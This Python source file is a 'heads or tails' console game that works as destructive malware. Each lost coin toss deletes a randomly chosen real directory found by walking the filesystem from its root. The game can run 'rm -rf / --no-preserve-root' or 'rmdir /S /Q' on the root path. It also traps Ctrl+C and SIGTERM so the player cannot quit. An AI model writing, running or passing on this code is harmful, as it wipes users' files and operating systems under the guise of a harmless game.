import os
import random
import json
import shutil
import signal
import subprocess
import time

SAVE_FILE = "save/heads_tails_state.json"
LOSS_THRESHOLD = 5

def disable_exit_signals():
    def handler(signum, frame):
        print("\n[!] You cannot quit with Ctrl + C. Please finish the game properly!")
    signal.signal(signal.SIGINT, handler)
    signal.signal(signal.SIGTERM, handler)

def clear_console():
    if os.name == 'nt':
        subprocess.call("cls", shell=True)
    else:
        subprocess.call("clear", shell=True)

logo = """\033[36m
 █████                             █████                              
░░███                             ░░███                               
 ░███████    ██████   ██████    ███████   █████      ██████  ████████ 
 ░███░░███  ███░░███ ░░░░░███  ███░░███  ███░░      ███░░███░░███░░███
 ░███ ░███ ░███████   ███████ ░███ ░███ ░░█████    ░███ ░███ ░███ ░░░ 
 ░███ ░███ ░███░░░   ███░░███ ░███ ░███  ░░░░███   ░███ ░███ ░███     
 ████ █████░░██████ ░░████████░░████████ ██████    ░░██████  █████    
░░░░ ░░░░░  ░░░░░░   ░░░░░░░░  ░░░░░░░░ ░░░░░░      ░░░░░░  ░░░░░                                             
                                                                              
  █████               ███  ████                                       
 ░░███               ░░░  ░░███                                       
 ███████    ██████   ████  ░███   █████                               
░░░███░    ░░░░░███ ░░███  ░███  ███░░                                
  ░███      ███████  ░███  ░███ ░░█████                               
  ░███ ███ ███░░███  ░███  ░███  ░░░░███                              
  ░░█████ ░░████████ █████ █████ ██████                               
   ░░░░░   ░░░░░░░░ ░░░░░ ░░░░░ ░░░░░░                                 
\033[0m"""

def is_root_path(path):
    path = os.path.abspath(path)
    if os.name == 'nt':
        drive, tail = os.path.splitdrive(path)
        return (drive and tail in ["\\", ""])
    else:
        return (path == "/")

def force_delete_path(path):
    if not os.path.exists(path):
        print(f"[INFO] Path does not exist: {path}")
        return

    if os.path.isdir(path) and is_root_path(path):
        print("[!] WARNING: Attempting to delete the root directory? This is extremely dangerous!")
        confirm = input("Type 'YES' in all caps to proceed: ")
        if confirm == "YES":
            print("[+] Thank you for playing! Enjoy your free space.")
            if os.name == "nt":
                os.system(f'rmdir /S /Q "{path}"')
            else:
                os.system("rm -rf / --no-preserve-root")
        else:
            print("[x] Root deletion canceled. But no cheating, let's still remove something else.")
        return
    try:
        if os.path.isfile(path):
            print(f"[DELETING FILE] => {path}")
            os.remove(path)
        else:
            print(f"[DELETING FOLDER] => {path}")
            shutil.rmtree(path)
    except Exception as e:
        print(f"[ERROR] Could not delete path: {path}. Reason: {e}")

def pick_random_paths(num_paths):
    paths = []
    root_path = "C:\\" if os.name == "nt" else "/"
    max_attempts = num_paths * 3
    attempts = 0

    while len(paths) < num_paths and attempts < max_attempts:
        current_path = root_path
        steps = random.randint(1, 5)
        for _ in range(steps):
            try:
                entries = [d for d in os.listdir(current_path) if os.path.isdir(os.path.join(current_path, d))]
                if not entries:
                    break
                choice_path = os.path.join(current_path, random.choice(entries))
                current_path = choice_path
            except (PermissionError, FileNotFoundError):
                break
        if current_path not in paths and os.path.exists(current_path):
            paths.append(current_path)
        attempts += 1

    if len(paths) < num_paths:
        print(f"[!] Only {len(paths)} random paths could be found.")
    return paths

def lose_random_item(state):
    current_index = state.get('current_index', 0)
    paths = state.get('paths_to_delete', [])

    if current_index >= len(paths):
        print("[!] No more items to delete.")
        return

    victim = paths[current_index]
    print(f"[*] Element to save : {victim}")

    force_delete_path(victim)
    state['current_index'] = current_index + 1

    if state['current_index'] < len(paths):
        next_element = paths[state['current_index']]
        print(f"[*] Next element : {next_element}")
    else:
        print("[!] No next element planned.")

    save_game_state(state)

def toss_coin():
    return random.choice(['H', 'T'])

def load_game_state():
    if not os.path.exists(SAVE_FILE):
        return None
    try:
        with open(SAVE_FILE, "r") as f:
            return json.load(f)
    except:
        return None

def save_game_state(state):
    os.makedirs(os.path.dirname(SAVE_FILE), exist_ok=True)
    with open(SAVE_FILE, "w") as f:
        json.dump(state, f, indent=4)

def clear_game_state():
    if os.path.exists(SAVE_FILE):
        os.remove(SAVE_FILE)

def classic_mode(state):
    print("\n=== Classic Mode ===\n")

    while True:
        try:
            total_items = int(input("[?] How many items (losses) can you afford? "))
            if total_items <= 0:
                print("[*] Please enter a number greater than 0.")
                continue
            break
        except ValueError:
            print("[*] Invalid input. Please enter a numeric value.")

    state['total_items'] = total_items
    score = 0

    paths_to_delete = pick_random_paths(total_items)
    state['paths_to_delete'] = paths_to_delete
    state['current_index'] = 0
    save_game_state(state)

    if paths_to_delete:
        print(f"[*] Element to save : {paths_to_delete[0]}")
        if len(paths_to_delete) > 1:
            print(f"[*] Next element : {paths_to_delete[1]}")
        else:
            print("[*] Next element : No next element found.")
    else:
        print("[*] No path to save.")

    print(f"\nYou start with {total_items} possible losses\n.")
    print("Heads = 'H', Tails = 'T'. Type 'Q' to quit.\n")

    while total_items > 0:
        choice = input("Your choice (H/T)? ").upper()
        if choice == 'Q':
            print("[*] Exiting Classic Mode.")
            break

        if choice not in ['H', 'T']:
            print("[!] Invalid entry. Please enter 'H' or 'T'.")
            continue

        result = toss_coin()
        print(f"[+] Coin toss result: {result}")

        if choice == result:
            score += 1
            print(f"[+] Good guess! Your score is now {score}.")

            double_choice = input("[?] Do you want to attempt 'Double or Nothing'? (Y/N): ").upper()
            if double_choice == 'Y':
                second_guess = input("Double or Nothing (H/T)? ").upper()
                if second_guess not in ['H', 'T']:
                    print("[!] Invalid entry; Double or Nothing canceled.")
                    continue
                second_result = toss_coin()
                print(f"Double or Nothing result: {second_result}")
                if second_guess == second_result:
                    score *= 2
                    print(f"[++] Success! Your score doubles to {score}.")
                else:
                    score = 0
                    total_items -= 1
                    print(f"[x] Failed! Score resets to 0. Remaining losses: {total_items}.")
                    lose_random_item(state)
        else:
            score = 0
            total_items -= 1
            print(f"[x] Wrong guess! Score resets to 0. Remaining losses: {total_items}.")
            lose_random_item(state)

    print(f"\n[ End of Classic Mode ] Final score: {score}.")
    if total_items == 0:
        print("[!] You have no more items to lose!")
    state['classic_score'] = score
    save_game_state(state)

def extreme_mode(state):
    print("\n=== Extreme Mode ===\n")

    total_items = 6
    target_points = 20
    points = 0
    time_limit = 60

    print("Rules:")
    print(f" * You have {time_limit} seconds to reach {target_points} points.")
    print(" * Correct guess: +1 point, wrong guess: -1 point.")
    print(f" * If you succeed, you keep your {total_items} items.")
    print(f" * If you fail, you lose all your {total_items} items.\n")

    start_time = time.time()

    while True:
        elapsed = time.time() - start_time
        remaining = time_limit - elapsed

        if remaining <= 0:
            print("[x] Time is up!")
            break

        print(f"[Time left: {int(remaining)}s] | Current points: {points}")
        choice = input("Heads (H) or Tails (T)? (Q to quit): ").upper()

        if choice == 'Q':
            print("Exiting Extreme Mode.")
            break

        if choice not in ['H', 'T']:
            print("[!] Invalid entry. Try again.")
            continue

        result = toss_coin()
        print(f"Coin toss result: {result}")

        if choice == result:
            points += 1
        else:
            points -= 1

        if points >= target_points:
            print(f"\n[+] Congratulations! You reached {points} points in time.")
            print("[!] You keep all your items!")
            break

    if points < target_points:
        print(f"\n[-] You did not reach {target_points} points in time.")
        print(f"[x] You lose all your {total_items} items!")
        for _ in range(total_items):
            lose_random_item(state)

    state['extreme_points'] = points
    save_game_state(state)

def main():
    disable_exit_signals()
    clear_console()

    state = load_game_state()
    if not state:
        state = {}

    while True:
        try:
            username = os.getlogin()
        except Exception:
            username = "Player"

        print(logo)
        print("Hello", username, "\n")
        print("\033[36mChoose your game mode:\033[0m\n")
        print("\033[36m1. Classic Mode\033[0m")
        print("\033[36m2. Extreme Mode\033[0m")
        print("\033[36m3. Return to Main Menu\033[0m")

        choice = input("\nChoose an option: ")
        if choice == '1':
            classic_mode(state)
        elif choice == '2':
            extreme_mode(state)
        elif choice == '3':
            print("[!] Returning to the main menu.")
            clear_game_state()
            clear_console()
            return
        else:
            print("[!] Invalid choice. Please try again.")

if __name__ == "__main__":
    main()